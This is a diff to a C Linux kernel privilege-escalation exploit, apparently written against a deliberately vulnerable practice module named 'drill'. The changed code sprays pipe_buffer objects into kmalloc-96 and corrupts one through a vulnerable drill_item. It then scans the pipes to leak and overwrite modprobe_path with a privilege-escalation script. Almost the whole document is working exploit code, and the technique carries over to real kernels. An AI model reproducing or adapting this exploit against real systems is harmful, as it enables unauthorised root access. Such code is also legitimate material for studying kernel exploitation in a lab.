@@ -271,16 +271,16 @@ int main(void)
 		}
 	}
 	printf("[+] opened pipes\n");
-
 	memset(pipe_data, 0, sizeof(pipe_data));
 
+	/* place vulnerable drill_item before pipe_buffers */
+	ret = act(act_fd, DRILL_ACT_ALLOC, 0, NULL);
+	if (ret == EXIT_FAILURE) {
+		perror("[-] drill spray");
+		goto end;
+	}
+
 	for (int i = 0; i < PIPES_N; i++) {
-		/* place vulnerable drill_item between pipe_buffer */
-		ret = act(act_fd, DRILL_ACT_ALLOC, i, NULL);
-		if (ret == EXIT_FAILURE) {
-			perror("[-] drill spray");
-			goto end;
-		}
 		/*
  		 * A `drill_item` object allocated in kmalloc-96 cache. It is known that the size of the
  		 * `pipe_buffer' is 40 bytes, which means that we need two of them to reach kmalloc-96.
@@ -298,43 +298,36 @@ int main(void)
 	printf("[+] sprayed pipe_buffers in kmalloc-96\n");
 
 	printf("[*] trying to corrupt `pipe_buffer`...\n");
-	for (int d = 0; d < PIPES_N; d++) {
-		snprintf(err_act, sizeof(err_act), "3 %d 0x%lx 0x50", d,
-			 VIRTUAL_TO_PAGE(MODPROBE_PTR));
-		ret = write(act_fd, err_act, strlen(err_act) + 1);
-		if (ret <= 0) {
-			ret = EXIT_FAILURE;
+	snprintf(err_act, sizeof(err_act), "3 %d 0x%lx 0x50", 0, VIRTUAL_TO_PAGE(MODPROBE_PTR));
+	ret = write(act_fd, err_act, strlen(err_act) + 1);
+	if (ret <= 0) {
+		ret = EXIT_FAILURE;
+		goto end;
+	}
+
+	printf("[*] trying to leak modprobe_path...\n");
+	for (int i = 0; i < PIPES_N; i++) {
+		ret = read(pipe_fds[i][0], pipe_data, sizeof(pipe_data));
+		if (ret < 0) {
+			perror("[-] read");
 			goto end;
 		}
-
-		printf("[*] trying to leak modprobe_path...\n");
-		for (int i = 0; i < PIPES_N; i++) {
-			ret = read(pipe_fds[i][0], pipe_data, sizeof(pipe_data));
-			if (ret < 0) {
-				perror("[-] read");
+		ret = search_and_overwrite_modprobe(pipe_fds, pipe_data, modprobe_path,
+						    privesc_script_path, i);
+		if (ret == EXIT_SUCCESS) {
+			success = true;
+			break;
+		} else {
+			/*
+			 * If we scan current pipe and it is not corrupted,
+			 * we will write back exactly the same data we read.
+			 * It helps to read pipes many times properly.
+			 */
+			if (write(pipe_fds[i][1], pipe_data, sizeof(pipe_data)) < 0) {
+				perror("[-] write");
 				goto end;
 			}
-			ret = search_and_overwrite_modprobe(pipe_fds, pipe_data, modprobe_path,
-							    privesc_script_path, i);
-			if (ret == EXIT_SUCCESS) {
-				success = true;
-				break;
-			} else {
-				/*
-				* If we scan current pipe and it is not corrupted,
-				* we will write back exactly the same data we read.
-				* It helps to read pipes many times properly.
-				*/
-				if (write(pipe_fds[i][1], pipe_data, sizeof(pipe_data)) < 0) {
-					perror("[-] write");
-					goto end;
-				}
-			}
 		}
-		if (success)
-			break;
-		else
-			printf("[-] unable to leak modprobe_path. Trying again!\n");
 	}
 
 	if (!success) {
